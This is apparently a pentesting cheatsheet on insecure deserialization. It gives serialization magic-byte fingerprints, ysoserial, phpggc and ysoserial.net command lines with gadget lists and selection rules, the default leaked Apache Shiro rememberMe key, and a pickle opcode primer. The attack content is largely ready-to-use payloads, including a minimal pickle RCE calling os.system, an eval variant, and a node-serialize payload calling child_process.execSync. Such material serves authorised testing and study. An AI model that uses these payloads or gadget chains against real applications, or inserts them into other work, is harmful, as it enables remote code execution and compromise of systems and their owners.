---
title: "Deserialization Gadgets - Magic Bytes, ysoserial/phpggc Lists, Pickle Opcodes"
category: web
subcategory: deserialization
type: cheatsheet
tags: [deserialization, magic-bytes, ysoserial, phpggc, pickle, marshal, viewstate, binaryformatter, commonscollections, gadget, java, php, dotnet, python, ruby, node, fingerprint]
summary: "Magic-byte fingerprints for every serialization format, ysoserial/phpggc/ysoserial.net gadget name lists with what each needs, and a pickle opcode primer."
tools: [ysoserial, phpggc, ysoserial-net, pickletools, fickling]
related: [deser-java-ysoserial, deser-php-object-injection, deser-python-pickle, deser-dotnet-viewstate, ruby-marshal-yaml-rce, deser-node-vm-escape]
---

## Magic-byte / prefix fingerprints

```
# Java (java.io.Serializable)
AC ED 00 05            raw stream (STREAM_MAGIC 0xACED, version 5)
rO0AB                  base64 of AC ED 00 05
rO0ABQ==               base64 of just the header
H4sIA...               gzip'd java stream (base64), decompress then check AC ED

# PHP serialize()
O:4:"User":            object
a:2:{                  array
s:3:"abc";             string
C:4:"Name":            Serializable object
Tzo0OiJ...             base64 of O:4:"...

# PHP phar
GBMB                   phar magic trailer (last 4 bytes before EOF)
__HALT_COMPILER();     stub marker

# Python pickle
80 02 / 80 03 / 80 04 / 80 05   protocol 2/3/4/5 (\x80 + proto)
28 6c 70 30 0a? / (               protocol 0 (ASCII), often starts 'c' or '('
gAJ / gAM / gASV / gAWV          base64 of \x80\x02 / \x80\x03 / \x80\x04 / \x80\x05
ends with .                      STOP opcode

# Python marshal (.pyc code objects)
first 16 bytes = magic + flags (version-specific)

# Ruby Marshal
04 08                  \x04\x08
BAg / BAh              base64 of \x04\x08...

# Ruby YAML (Psych)
--- !ruby/object:      tagged object
!ruby/hash: / !ruby/struct:

# .NET BinaryFormatter
00 01 00 00 00 FF FF FF FF   header
AAEAAAD/////                 base64 of the header

# .NET LosFormatter / ObjectStateFormatter (ViewState)
FF 01                        LOSFormatter marker (first byte 0xFF)
/wEP / /wEW                  base64 ViewState (often)
/wEl / /wEy                  other common ViewState starts

# .NET JSON.NET (TypeNameHandling)
"$type":"System....         type discriminator present

# Node node-serialize
_$$ND_FUNC$$_                function marker in the JSON

# Java JSF ViewState / Spring
javax.faces.ViewState        form field
rememberMe=                  Apache Shiro cookie (AES-CBC then deserialize)

# MessagePack / BSON / protobuf -- binary, no ASCII magic; check content-type
```

## ysoserial (Java) gadget list + requirements

```
# usage
java -jar ysoserial.jar <Gadget> '<command>' > payload.bin
java -jar ysoserial.jar <Gadget> '<command>' | base64 -w0

# detection-only (no RCE, works everywhere) -- confirms deserialization via DNS
URLDNS                     no lib; DNS lookup to your canary domain
JRMPClient                 no lib; outbound JRMP connection (blind confirm)

# Apache Commons Collections
CommonsCollections1        commons-collections 3.1 ; JDK < 8u71 (AnnotationInvocationHandler)
CommonsCollections2        commons-collections4 4.0 ; TemplatesImpl (JDK-version independent)
CommonsCollections3        commons-collections 3.1 ; TemplatesImpl+TrAXFilter (no Transformer chain)
CommonsCollections4        commons-collections4 4.0
CommonsCollections5        commons-collections 3.1 ; BadAttributeValueExpException (JDK indep)
CommonsCollections6        commons-collections 3.1 ; HashSet/TiedMapEntry (JDK indep) -- most reliable
CommonsCollections7        commons-collections 3.1 ; Hashtable

# Commons BeanUtils
CommonsBeanutils1          commons-beanutils + commons-collections + commons-logging

# Spring
Spring1                    spring-core + spring-beans 4.x
Spring2                    spring-core + spring-aop

# no-library / JDK-only
Jdk7u21                    JDK <= 7u21 (no external lib)
JRE8u20                    JRE 8u20 (finalizer)

# others (library in parentheses)
Groovy1                    (groovy 2.3.x) ; MethodClosure
Hibernate1 / Hibernate2    (hibernate-core)
C3P0                       (c3p0)
Clojure                    (clojure)
Rome                       (rome) ; ToStringBean
MozillaRhino1 / MozillaRhino2   (js.jar / rhino)
Vaadin1                    (vaadin-server)
Click1                     (click-nodeps)
BeanShell1                 (bsh)
FileUpload1                (commons-fileupload) -- FILE WRITE, not exec
Myfaces1 / Myfaces2        (myfaces)
JSON1                      (multiple json libs)
AspectJWeaver              (aspectjweaver) -- file write

# JRMP listener (for two-stage / ObjectInputStream in RMI)
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 'id'
java -cp ysoserial.jar ysoserial.exploit.JRMPClient <host> <port> <Gadget> 'cmd'

# gadget selection quick rules
#  - unknown libs, just confirm  -> URLDNS
#  - commons-collections present -> CC6 (JDK-independent) first, then CC1/CC5
#  - only need bytecode loading  -> CC3 / CC2 (TemplatesImpl)
#  - JDK <= 7u21, no libs        -> Jdk7u21
#  - need a file written         -> FileUpload1 / AspectJWeaver
```

## Apache Shiro rememberMe

```sh
# default leaked key (Shiro < 1.2.5): AES-CBC, then deserialize
# key (base64): kPH+bIxk5D2deZiIxcaaaA==
# rememberMe = base64( AES-CBC( ysoserial_payload, key, iv ) )
# tools: shiro_exploit, ShiroExploit, or a python AES-CBC + ysoserial pipeline
```

## phpggc (PHP) gadget families + requirements

```sh
# usage
phpggc -l                          # list all
phpggc -l monolog                  # filter
phpggc -i Monolog/RCE1             # info: what it needs
phpggc Monolog/RCE1 system id      # raw serialized
phpggc -b Monolog/RCE1 system id   # base64
phpggc -u Monolog/RCE1 system id   # url-encoded
phpggc -f -b Monolog/RCE1 system id   # fast-destruct (fire __destruct early)
phpggc -w -b Monolog/RCE1 system id   # add __wakeup skip (CVE-2016-7124)
phpggc -p phar -o evil.phar Monolog/RCE1 system id     # wrap in a phar
phpggc -p phar -pp gif -o evil.gif Monolog/RCE1 system id   # GIF-polyglot phar

# families (suffix: RCE=exec, FW=file write, FR=file read, FD=file delete, SQLI, INFO)
Monolog/RCE1..RCE9         monolog/monolog (various versions)
Laravel/RCE1..*            laravel framework (version-specific)
Symfony/RCE1..*            symfony components
Guzzle/RCE1, Guzzle/FW1    guzzlehttp/guzzle
ZendFramework/RCE1..4      zendframework
Doctrine/RCE1, Doctrine/FW1   doctrine
SwiftMailer/FW1..3         swiftmailer (file write)
Phalcon/RCE1               phalcon
SlimPHP/RCE1               slim
Yii/RCE1..2                yiisoft
CodeIgniter4/RCE1..*       codeigniter4
WordPress/RCE1, WordPress/Dompdf/*   wordpress + plugin
Magento/*, Drupal7/*, TYPO3/*        the CMS
```

## ysoserial.net (.NET) gadgets

```sh
# usage
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "cmd"
# ViewState (needs the machineKey):
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  --generator=<VIEWSTATEGENERATOR> --validationalg=SHA1 \
  --validationkey=<hex> -c "cmd"
# with encryption:
ysoserial.exe -p ViewState -g TypeConfuseDelegate --path="/app/page.aspx" \
  --apppath="/" --decryptionalg=AES --decryptionkey=<hex> \
  --validationalg=HMACSHA256 --validationkey=<hex> -c "cmd"

# gadgets
TypeConfuseDelegate            BinaryFormatter/LosFormatter/SoapFormatter -- most common
ActivitySurrogateSelector      needs DisableActivitySurrogateSelectorTypeCheck on .NET 4.8+
ActivitySurrogateSelectorFromFile   compile+run a C# file
ObjectDataProvider             XAML/Json.Net/DataContract/wrappers
WindowsIdentity                Json.Net (TypeNameHandling)
DataSet                        BinaryFormatter/SoapFormatter
TextFormattingRunProperties    SharePoint / WPF
PSObject                       CVE-2017-8565 (PowerShell)
ClaimsIdentity, RolePrincipal, SessionSecurityToken, ResourceSet, AxHostState

# formatters (-f)
BinaryFormatter LosFormatter ObjectStateFormatter SoapFormatter
NetDataContractSerializer DataContractSerializer Json.Net JavaScriptSerializer
XmlSerializer DataContractJsonSerializer FastJson FsPickler SharpSerializer Xaml
```

## Python pickle opcode primer

```
# a pickle is a stack machine; REDUCE calls func(*args)
\x80 N          PROTO         declare protocol N
\x95 <q>        FRAME         proto4 frame, 8-byte LE length
c mod\nname\n    GLOBAL        push getattr(import(mod), name)  <- find_class
\x8c len s      SHORT_BINUNICODE   push str
X <i> s         BINUNICODE    push str (4-byte LE len)
\x93            STACK_GLOBAL  pop name,module -> like GLOBAL
) \x85 \x86 \x87  EMPTY/1/2/3-TUPLE
( t             MARK / TUPLE
R               REDUCE        func,args=pop,pop; push func(*args)   <- RCE
b               BUILD         obj.__setstate__(state) or __dict__.update
\x81 \x92       NEWOBJ/NEWOBJ_EX   cls.__new__(cls,*args)  (skips __init__)
} s u           EMPTY_DICT / SETITEM / SETITEMS
\x94            MEMOIZE
h i / j <i>     BINGET / LONG_BINGET
.               STOP

# minimal RCE (proto 0, printable): os.system('id')
cos\nsystem\n(S'id'\ntR.
# builtins.eval via STACK_GLOBAL (avoids the 'c' opcode)
\x80\x04\x95..\x8c\x08builtins\x8c\x04eval\x93\x8c\x03..\x85R.

# inspect WITHOUT executing:
python3 -m pickletools -a payload.pkl
python3 -c "import pickletools;[print(o.name,a) for o,a,_ in pickletools.genops(open('p.pkl','rb').read())]"

# useful callables: exec eval __import__ getattr os.system subprocess.Popen
#                    pty.spawn operator.methodcaller functools.partial
#                    types.FunctionType(marshal.loads(...),globals())
```

## Ruby / Node quick refs

```
# Ruby Marshal.load -> universal Gem::* gadget (build in ruby, Marshal.dump)
# Ruby YAML.load (Psych<4) -> !ruby/object:Gem::Requirement ... Net::WriteAdapter -> Kernel.system
# Node node-serialize -> {"x":"_$$ND_FUNC$$_function(){require('child_process').execSync('id')}()"}
# Node js-yaml <3.13 -> "x": !!js/function "function(){...}"
```

## References

- frohoff/ysoserial, pwntester/ysoserial.net, ambionics/phpggc -- READMEs.
- CPython pickle docs; PEP 307.
- Apache Shiro CVE-2016-4437 (rememberMe deserialization).
